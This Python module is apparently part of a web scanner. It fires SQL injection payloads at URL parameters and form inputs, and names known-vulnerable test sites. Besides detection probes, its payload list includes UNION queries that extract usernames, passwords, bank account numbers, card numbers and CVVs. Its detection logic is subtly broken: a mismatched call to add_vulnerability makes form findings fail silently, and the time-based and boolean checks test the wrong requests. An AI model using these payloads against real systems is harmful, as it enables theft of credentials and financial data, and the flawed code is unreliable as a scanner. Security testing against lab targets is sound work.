from .base_scanner import BaseScanner
from bs4 import BeautifulSoup
import urllib.parse
from datetime import datetime
import re
import time
import traceback

# Define test cases for vulnerable websites
SQL_TEST_CASES = [
    # Known vulnerable parameters for testphp.vulnweb.com
    'id',
    'cat',
    'artist',
    'pid',
    
    # Known vulnerable paths for testphp.vulnweb.com
    '/listproducts.php',
    '/product.php',
    '/artists.php',
    '/categories.php',
    
    # Known vulnerable parameters for zero.webappsecurity.com
    'account',
    'searchTerm',
    'transfer_funds_form',
    'payee',
    'amount',
    'description',
    
    # Known vulnerable paths for zero.webappsecurity.com
    '/bank/account-summary.html',
    '/bank/transfer-funds.html',
    '/bank/pay-bills-saved-payee.html',
    '/search.html',
    '/online-banking.html'
]

# Define SQL injection payloads
SQL_PAYLOADS = [
    # Basic SQL injection
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'x'='x",
    
    # Order by injection
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    
    # Union based injection
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    
    # Error based injection
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    "' SELECT @@version--",
    
    # Time based injection
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    
    # Advanced payloads
    "' UNION SELECT NULL,username,password FROM users--",
    "' AND 1=0 UNION SELECT NULL,account_number,balance FROM accounts--",
    "' AND 1=0 UNION SELECT NULL,username,password FROM login--",
    
    # Banking specific payloads
    "' OR account_balance > 1000000--",
    "' UNION SELECT NULL,account_number,routing_number FROM bank_accounts--",
    "' AND 1=0 UNION SELECT NULL,card_number,cvv FROM credit_cards--",
    
    # Time based detection
    "' AND SLEEP(5)--",
    "' WAITFOR DELAY '0:0:5'--",
    "' BENCHMARK(50000000,MD5(1))--",
    
    # Boolean based
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b"
]

class SQLScanner(BaseScanner):
    def __init__(self, session, config):
        super().__init__(session, config)
        self.vulnerabilities = []
        self.sql_payloads = SQL_PAYLOADS
        self.test_cases = SQL_TEST_CASES
        
        # SQL Error patterns
        self.sql_errors = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_.*",
            "valid MySQL result",
            "MySqlClient\.",
            "PostgreSQL.*ERROR",
            "Warning.*pg_.*",
            "valid PostgreSQL result",
            "Npgsql\.",
            "Driver.* SQL[\-\_\ ]*Server",
            "OLE DB.* SQL Server",
            "SQLServer JDBC Driver",
            "Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "Oracle error",
            "Oracle.*Driver",
            "Warning.*oci_.*",
            "Warning.*ora_.*",
            "quoted string not properly terminated",
            "SQL command not properly ended",
            "ORA-[0-9][0-9][0-9][0-9]",
            "Microsoft Access Driver",
            "JET Database Engine",
            "Access Database Engine",
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "SQLITE_ERROR",
            "Warning.*sqlite_.*",
            "DB2 SQL error",
            "DB2 Native",
            "CLI Driver.*DB2",
            "Warning.*db2_.*"
        ]

    async def scan(self, url):
        """Enhanced SQL injection scanning"""
        try:
            self.log(f"Starting SQL injection scan for {url}", "INFO")
            
            # Ensure session is available
            if not await self.ensure_session():
                self.log("Failed to ensure session availability", "ERROR")
                return {
                    'vulnerabilities': [],
                    'logs': self.scan_logs,
                    'error': 'Session initialization failed'
                }

            results = []

            # Phase 1: Initial Access
            self.log("Phase 1: Accessing target page", "INFO")
            response, content = await self.make_request(
                url,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                }
            )

            if not response or not content:
                self.log("Failed to access target URL", "ERROR")
                return {
                    'vulnerabilities': [],
                    'logs': self.scan_logs,
                    'error': 'Failed to access target URL'
                }

            # Phase 2: Entry Point Analysis
            self.log("Phase 2: Analyzing entry points", "INFO")
            entry_points = await self.identify_entry_points(content)
            self.log(f"Found {len(entry_points)} potential entry points", "INFO")

            # Phase 3: Testing Entry Points
            self.log("Phase 3: Testing for SQL injection", "INFO")
            for entry_point in entry_points:
                try:
                    if entry_point['type'] == 'parameter':
                        param_results = await self.test_parameter(url, entry_point)
                        if param_results:
                            results.extend(param_results)
                    elif entry_point['type'] == 'form':
                        form_results = await self.test_form(url, entry_point)
                        if form_results:
                            results.extend(form_results)
                except Exception as e:
                    self.log(f"Error testing entry point: {str(e)}", "ERROR")
                    continue

            return {
                'vulnerabilities': results,
                'logs': self.scan_logs,
                'stats': {
                    'entry_points_tested': len(entry_points),
                    'vulnerabilities_found': len(results)
                }
            }

        except Exception as e:
            self.log(f"Scan error: {str(e)}", "ERROR")
            return {
                'vulnerabilities': [],
                'logs': self.scan_logs,
                'error': str(e)
            }

    async def identify_entry_points(self, content):
        """Identify potential SQL injection entry points"""
        entry_points = []
        try:
            soup = BeautifulSoup(content, 'html.parser')

            # Check URL parameters
            parsed_url = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed_url.query)
            for param in params:
                entry_points.append({
                    'type': 'parameter',
                    'name': param,
                    'value': params[param][0],
                    'context': 'url'
                })

            # Check forms
            forms = soup.find_all('form')
            for form in forms:
                # Add form itself as entry point
                entry_points.append({
                    'type': 'form',
                    'method': form.get('method', 'get').upper(),
                    'action': form.get('action', ''),
                    'inputs': []
                })

                # Check form inputs
                for input_field in form.find_all(['input', 'textarea']):
                    if self.is_testable_input(input_field):
                        entry_points.append({
                            'type': 'parameter',
                            'name': input_field.get('name', ''),
                            'value': input_field.get('value', ''),
                            'context': 'form'
                        })

            return entry_points

        except Exception as e:
            self.log(f"Error identifying entry points: {str(e)}", "ERROR")
            return []

    def is_testable_input(self, input_field):
        """Check if input field should be tested"""
        if not input_field.get('name'):
            return False
            
        input_type = input_field.get('type', '').lower()
        skip_types = ['hidden', 'submit', 'button', 'image', 'file']
        
        return input_type not in skip_types

    async def test_parameter(self, url, entry_point):
        """Test a parameter for SQL injection"""
        results = []
        try:
            original_value = entry_point.get('value', '')
            param_name = entry_point['name']

            for payload in self.sql_payloads:
                try:
                    # Create test URL with payload
                    test_url = self.create_test_url(url, param_name, payload)
                    
                    # Make request with payload
                    response, content = await self.make_request(test_url)
                    if response and content:
                        # Check for SQL errors
                        if self.check_sql_error(content):
                            self.add_vulnerability(
                                type_name="SQL Injection",
                                description=f"SQL injection vulnerability found in parameter {param_name}",
                                severity="High",
                                details={
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': url,
                                    'evidence': self.get_error_evidence(content)
                                }
                            )
                            results.append({
                                'type': 'SQL Injection',
                                'parameter': param_name,
                                'payload': payload,
                                'url': url
                            })
                            break  # Found vulnerability, no need to test more payloads

                except Exception as e:
                    self.log(f"Error testing payload {payload}: {str(e)}", "ERROR")
                    continue

            return results

        except Exception as e:
            self.log(f"Error testing parameter {entry_point.get('name')}: {str(e)}", "ERROR")
            return []

    def create_test_url(self, url, param_name, payload):
        """Create URL with SQL injection payload"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param_name] = [payload]
        return urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            urllib.parse.urlencode(params, doseq=True),
            parsed.fragment
        ))

    def check_sql_error(self, content):
        """Check for SQL error messages"""
        error_patterns = [
            'sql syntax.*mysql',
            'warning.*mysql',
            'mysql.*error',
            'sql syntax.*mariadb',
            'oracle.*error',
            'postgresql.*error',
            'sqlserver.*error',
            'microsoft.*database.*error',
            'warning.*postgresql.*',
            'sqlite.*syntax'
        ]
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in error_patterns)

    def get_error_evidence(self, content):
        """Extract SQL error evidence from response"""
        # Find the first SQL error message
        for pattern in [
            r'(sql syntax.*mysql)',
            r'(warning.*mysql)',
            r'(mysql.*error)',
            r'(sql syntax.*mariadb)',
            r'(oracle.*error)',
            r'(postgresql.*error)',
            r'(sqlserver.*error)',
            r'(microsoft.*database.*error)',
            r'(warning.*postgresql.*)',
            r'(sqlite.*syntax)'
        ]:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def add_vulnerability(self, description, severity, details=None):
        """Add a vulnerability with detailed information"""
        vuln = {
            'type': 'SQL Injection',
            'description': description,
            'severity': severity,
            'details': details,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        self.vulnerabilities.append(vuln)
        self.logger.warning(f"Found SQL injection vulnerability: {description}")

    async def test_form(self, url, form):
        """Test a form for SQL injection vulnerabilities"""
        try:
            # Get form details
            if isinstance(form, dict):
                # Handle form data passed as dictionary
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = form.get('inputs', [])
            else:
                # Handle BeautifulSoup form object
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea'])
            
            # Build full action URL
            if action:
                if action.startswith('/'):
                    parsed_url = urllib.parse.urlparse(url)
                    action_url = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
                elif not action.startswith(('http://', 'https://')):
                    action_url = urllib.parse.urljoin(url, action)
                else:
                    action_url = action
            else:
                action_url = url

            self.logger.debug(f"Testing form at {action_url} with method {method}")

            # Test each input field
            for input_field in inputs:
                # Handle both dictionary and BeautifulSoup input objects
                if isinstance(input_field, dict):
                    input_type = input_field.get('type', '').lower()
                    input_name = input_field.get('name')
                else:
                    input_type = input_field.get('type', '').lower()
                    input_name = input_field.get('name')
                
                # Skip non-text inputs
                if not input_name or input_type in ['submit', 'button', 'image', 'file', 'hidden']:
                    continue

                # Test each payload type
                for payload_type, payloads in {
                    'error': [p for p in self.sql_payloads if "'" in p or '"' in p],
                    'time': [p for p in self.sql_payloads if 'SLEEP' in p or 'WAITFOR' in p],
                    'boolean': [p for p in self.sql_payloads if 'AND' in p or 'OR' in p]
                }.items():
                    for payload in payloads:
                        try:
                            if method == 'get':
                                test_url = f"{action_url}?{input_name}={urllib.parse.quote(payload)}"
                                response, content = await self.make_request(test_url)
                                if response and content:
                                    if await self.check_sql_vulnerability(content, payload, payload_type):
                                        self.add_vulnerability(
                                            type_name="SQL Injection",
                                            description=f"SQL injection vulnerability found in form input {input_name}",
                                            severity="High",
                                            details={
                                                'url': action_url,
                                                'method': method,
                                                'input': input_name,
                                                'payload': payload,
                                                'type': payload_type
                                            }
                                        )
                                        break  # Found vulnerability, move to next input

                            else:  # POST method
                                data = {input_name: payload}
                                response, content = await self.make_request(
                                    action_url,
                                    method='POST',
                                    data=data
                                )
                                if response and content:
                                    if await self.check_sql_vulnerability(content, payload, payload_type):
                                        self.add_vulnerability(
                                            type_name="SQL Injection",
                                            description=f"SQL injection vulnerability found in form input {input_name}",
                                            severity="High",
                                            details={
                                                'url': action_url,
                                                'method': method,
                                                'input': input_name,
                                                'payload': payload,
                                                'type': payload_type
                                            }
                                        )
                                        break  # Found vulnerability, move to next input

                        except Exception as e:
                            self.logger.error(f"Error testing payload {payload}: {str(e)}")
                            continue

        except Exception as e:
            self.logger.error(f"Error testing form: {str(e)}")

    async def check_sql_vulnerability(self, content, payload, payload_type):
        """Check for SQL injection vulnerability based on payload type"""
        try:
            if payload_type == 'error':
                # Check for SQL errors
                return self.check_sql_error(content)
            
            elif payload_type == 'time':
                # Check response time for time-based payloads
                start_time = time.time()
                response, _ = await self.make_request(self.url)
                duration = time.time() - start_time
                return duration > 5  # Adjust threshold as needed
            
            elif payload_type == 'boolean':
                # Check for differences in response
                true_payload = payload.replace('1=2', '1=1')
                false_payload = payload.replace('1=1', '1=2')
                
                response_true, content_true = await self.make_request(
                    self.url + f"?test={urllib.parse.quote(true_payload)}"
                )
                response_false, content_false = await self.make_request(
                    self.url + f"?test={urllib.parse.quote(false_payload)}"
                )
                
                if content_true and content_false:
                    return len(content_true) != len(content_false)
                
            return False
            
        except Exception as e:
            self.logger.error(f"Error checking SQL vulnerability: {str(e)}")
            return False